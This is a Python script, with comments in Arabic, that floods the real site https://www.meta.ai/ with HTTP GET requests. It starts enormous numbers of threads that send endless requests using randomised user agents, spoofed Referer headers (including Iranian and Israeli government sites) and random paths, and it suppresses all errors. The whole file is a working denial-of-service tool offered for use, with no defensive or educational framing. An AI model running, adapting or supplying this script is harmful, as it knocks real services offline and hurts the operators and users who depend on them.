import requests
import threading
import time
import random
from fake_useragent import UserAgent

connections_per_thread = 50000000000000000
num_threads = 50000000000000000
url = "https://www.meta.ai/"

referers = [
    "https://farsnews.ir/"
    "https://my.gov.ir/"
    "https://darkwebinformer.com/"
    "http://glz.co.il/"
    "https://www.idf.il/"
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.yahoo.com/",
    "https://www.duckduckgo.com/",
    "https://www.reddit.com/",
    "https://chat.openai.com/",
    "https://github.com/",
    "https://www.facebook.com/",
    "https://www.twitter.com/",
    "https://www.linkedin.com/",
    "https://www.youtube.com/",
    "https://www.amazon.com/",
    "https://www.wikipedia.org/",
    "https://www.medium.com/",
    "https://www.stackoverflow.com/",
    "https://www.quora.com/",
    "https://www.pinterest.com/",
    "https://www.tumblr.com/",
    "https://www.instagram.com/",
    "https://www.netflix.com/",
    "https://www.microsoft.com/",
    "https://www.apple.com/",
    "https://www.adobe.com/",
    "https://www.cloudflare.com/",
    "https://www.digitalocean.com/",
]

paths = [
    "/",
    "/about",
    "/contact",
    "/services",
    "/blog",
    "/news",
    "/faq",
    "/products"
]

base_headers = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Cache-Control": "no-cache",
}

ua = UserAgent()

def send_requests():
    local_session = requests.Session()
    while True:
        for _ in range(connections_per_thread):
            try:
                headers = base_headers.copy()
                headers["User-Agent"] = ua.random
                headers["Referer"] = random.choice(referers)
                full_url = url + random.choice(paths)
                local_session.get(full_url, headers=headers, timeout=5)
            except requests.exceptions.RequestException:
                pass  # تجاهل الأخطاء بدون طباعة أي شيء
        time.sleep(random.uniform(0.1, 0.5))

threads = []

for _ in range(num_threads):
    thread = threading.Thread(target=send_requests, daemon=True)
    threads.append(thread)
    thread.start()

try:
    while True:
        time.sleep(0.1)
except KeyboardInterrupt:
    pass  # لا تطبع أي رسالة عند الإيقاف
